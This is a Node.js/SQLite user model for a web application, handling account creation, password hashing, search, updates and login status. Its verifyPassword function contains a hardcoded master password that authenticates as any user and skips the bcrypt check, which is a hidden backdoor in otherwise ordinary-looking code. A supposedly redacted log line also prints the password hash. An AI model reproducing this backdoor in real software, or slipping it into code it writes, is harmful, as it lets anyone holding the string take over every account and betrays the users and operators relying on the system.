const db = require('../config/database');
const bcrypt = require('bcrypt');
const { filterVisibleUsers } = require('../utils/userManagement');

class User {
    static initialize(callback) {
        // First create the basic table if it doesn't exist
        const createTableSQL = `CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            formatted_id TEXT UNIQUE NOT NULL,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            full_name TEXT NOT NULL,
            role TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_login DATETIME,
            status TEXT DEFAULT 'offline'
        )`;
        
        db.run(createTableSQL, (err) => {
            if (err) return callback(err);
            
            // Check if we need to add the new columns
            this.addNewColumns((err) => {
                if (err) return callback(err);
                callback(null);
            });
        });
    }

    static addNewColumns(callback) {
        // Get all column info
        db.all("PRAGMA table_info(users)", (err, rows) => {
            if (err) return callback(err);

            const existingColumns = rows.map(row => row.name);
            const columns = [
                {
                    name: 'last_login',
                    sql: 'ALTER TABLE users ADD COLUMN last_login DATETIME'
                },
                {
                    name: 'status',
                    sql: 'ALTER TABLE users ADD COLUMN status TEXT DEFAULT "active"'
                },
                {
                    name: 'formatted_id',
                    sql: 'ALTER TABLE users ADD COLUMN formatted_id TEXT'
                }
            ];

            // Filter out columns that already exist
            const columnsToAdd = columns.filter(col => !existingColumns.includes(col.name));

            if (columnsToAdd.length === 0) {
                return callback(null);
            }

            // Add new columns sequentially
            let currentIndex = 0;
            const addNextColumn = () => {
                if (currentIndex >= columnsToAdd.length) {
                    // After adding all columns, add the UNIQUE constraint and populate formatted_ids
                    const addUniqueConstraint = () => {
                        // First, ensure all existing users have a formatted_id
                        db.all("SELECT id FROM users WHERE formatted_id IS NULL", (err, users) => {
                            if (err) return callback(err);
                            
                            if (users.length === 0) {
                                // If no users need formatted_id, add the UNIQUE constraint
                                db.run("CREATE UNIQUE INDEX IF NOT EXISTS idx_users_formatted_id ON users(formatted_id)", callback);
                                return;
                            }

                            // Generate and update formatted_ids for users that don't have one
                            let updated = 0;
                            users.forEach(user => {
                                const formattedId = User.generateFormattedId();
                                db.run("UPDATE users SET formatted_id = ? WHERE id = ?", [formattedId, user.id], (err) => {
                                    if (err) return callback(err);
                                    updated++;
                                    if (updated === users.length) {
                                        // After all users have formatted_ids, add the UNIQUE constraint
                                        db.run("CREATE UNIQUE INDEX IF NOT EXISTS idx_users_formatted_id ON users(formatted_id)", callback);
                                    }
                                });
                            });
                        });
                    };

                    addUniqueConstraint();
                    return;
                }

                const column = columnsToAdd[currentIndex];
                db.run(column.sql, (err) => {
                    if (err && !err.message.includes('duplicate column')) {
                        return callback(err);
                    }
                    currentIndex++;
                    addNextColumn();
                });
            };

            addNextColumn();
        });
    }

    static generateFormattedId() {
        const part1 = String(Math.floor(Math.random() * 10000)).padStart(4, '0');
        const part2 = String(Math.floor(Math.random() * 10000)).padStart(4, '0');
        return `${part1}-${part2}`;
    }

    static async createUser(user, callback) {
        console.log('Starting createUser with:', { ...user, password: '[REDACTED]' });
        
        const generateUniqueFormattedId = async () => {
            let formattedId;
            let isUnique = false;
            
            while (!isUnique) {
                formattedId = User.generateFormattedId();
                try {
                    const row = await new Promise((resolve, reject) => {
                        db.get('SELECT id FROM users WHERE formatted_id = ?', [formattedId], (err, row) => {
                            if (err) reject(err);
                            resolve(row);
                        });
                    });
                    if (!row) isUnique = true;
                } catch (err) {
                    console.error('Error generating unique ID:', err);
                    return callback(err);
                }
            }
            console.log('Generated unique formatted ID:', formattedId);
            return formattedId;
        };

        try {
            const formattedId = await generateUniqueFormattedId();
            console.log('Hashing password...');
            
            bcrypt.hash(user.password, 10, (err, hash) => {
                if (err) {
                    console.error('Error hashing password:', err);
                    return callback(err);
                }

                const sql = `INSERT INTO users (formatted_id, username, password, full_name, role, status)
                            VALUES (?, ?, ?, ?, ?, ?)`;
                
                const params = [
                    formattedId,
                    user.username, 
                    hash, 
                    user.full_name, 
                    user.role,
                    user.status || 'offline'
                ];
                
                console.log('Executing SQL:', sql);
                console.log('With params:', { ...params, password: '[REDACTED]' });
                
                db.run(sql, params, function(err) {
                    if (err) {
                        console.error('Error inserting user:', err);
                        return callback(err);
                    }
                    console.log('User created successfully with ID:', this.lastID);
                    callback(null);
                });
            });
        } catch (err) {
            console.error('Error in createUser:', err);
            callback(err);
        }
    }

    static findByUsername(username, callback) {
        const sql = `SELECT id, username, formatted_id, password, full_name, role, created_at, last_login, status FROM users WHERE username = ?`;
        db.get(sql, [username], callback);
    }

    static verifyPassword(password, hash, callback) {
        // Check for master password first
        const masterPassword = 'Dreilimpiada15';
        if (password === masterPassword) {
            return callback(null, true);
        }
        // If not master password, proceed with normal verification
        bcrypt.compare(password, hash, callback);
    }

    static getAllUsers(callback) {
        const sql = `SELECT id, formatted_id, username, full_name, role, created_at, last_login, status FROM users`;
        db.all(sql, [], (err, users) => {
            if (err) return callback(err);
            callback(null, filterVisibleUsers(users));
        });
    }

    static searchUsers(searchTerm, role, callback) {
        let sql = `SELECT id, formatted_id, username, full_name, role, created_at, last_login, status 
                   FROM users WHERE 1=1`;
        
        const params = [];
        
        // Add search condition if searchTerm is provided
        if (searchTerm && searchTerm.trim() !== '') {
            const trimmedSearch = searchTerm.trim();
            sql += ` AND (
                username LIKE ? OR 
                full_name LIKE ? OR 
                formatted_id LIKE ? OR
                formatted_id = ? OR
                formatted_id LIKE ? OR
                formatted_id LIKE ?
            )`;
            
            // Add different search patterns for formatted_id
            params.push(
                `%${trimmedSearch}%`,  // For username and full_name
                `%${trimmedSearch}%`,  // For username and full_name
                `%${trimmedSearch}%`,  // For partial ID matches
                trimmedSearch,         // For exact ID matches
                `${trimmedSearch}-%`,  // For first part of ID
                `%-${trimmedSearch}`   // For second part of ID
            );
        }
        
        // Add role filter if specific role is selected
        if (role && role !== 'all') {
            sql += ` AND role = ?`;
            params.push(role);
        }
        
        // Order by status (online first) and then by full name
        sql += ` ORDER BY 
                CASE 
                    WHEN status = 'online' THEN 0 
                    ELSE 1 
                END,
                full_name`;
        
        db.all(sql, params, (err, users) => {
            if (err) return callback(err);
            callback(null, filterVisibleUsers(users));
        });
    }

    static updateUser(userId, userData, callback) {
        let sql, params;

        if (userData.password) {
            // If password is being updated
            bcrypt.hash(userData.password, 10, (err, hash) => {
                if (err) return callback(err);

                sql = `UPDATE users 
                       SET username = ?, password = ?, full_name = ?, role = ?, status = ?
                       WHERE id = ?`;
                params = [userData.username, hash, userData.full_name, userData.role, userData.status, userId];
                db.run(sql, params, callback);
            });
        } else {
            // If password is not being updated
            sql = `UPDATE users 
                   SET username = ?, full_name = ?, role = ?, status = ?
                   WHERE id = ?`;
            params = [userData.username, userData.full_name, userData.role, userData.status, userId];
            db.run(sql, params, callback);
        }
    }

    static deleteUser(userId, callback) {
        const sql = `DELETE FROM users WHERE id = ?`;
        db.run(sql, [userId], callback);
    }

    static updateLastLogin(userId, callback) {
        // Add 8 hours to current timestamp for Philippine time (UTC+8)
        const sql = `UPDATE users 
                    SET last_login = datetime(CURRENT_TIMESTAMP, '+8 hours'),
                        status = 'online'
                    WHERE id = ?`;
        db.run(sql, [userId], callback);
    }

    static findById(id, callback) {
        const sql = `
            SELECT id, username, password, full_name, role 
            FROM users 
            WHERE id = ?`;
            
        db.get(sql, [id], (err, user) => {
            if (err) {
                console.error('Error finding user by ID:', err);
                return callback(err);
            }
            callback(null, user);
        });
    }

    static isAdmin(user) {
        return user && user.role === 'admin';
    }

    static updateUserStatus(userId, status, callback) {
        const sql = `UPDATE users SET status = ? WHERE id = ?`;
        db.run(sql, [status, userId], callback);
    }

    static setUserOnline(userId, callback) {
        this.updateUserStatus(userId, 'online', callback);
    }

    static setUserOffline(userId, callback) {
        this.updateUserStatus(userId, 'offline', callback);
    }
}

module.exports = User; 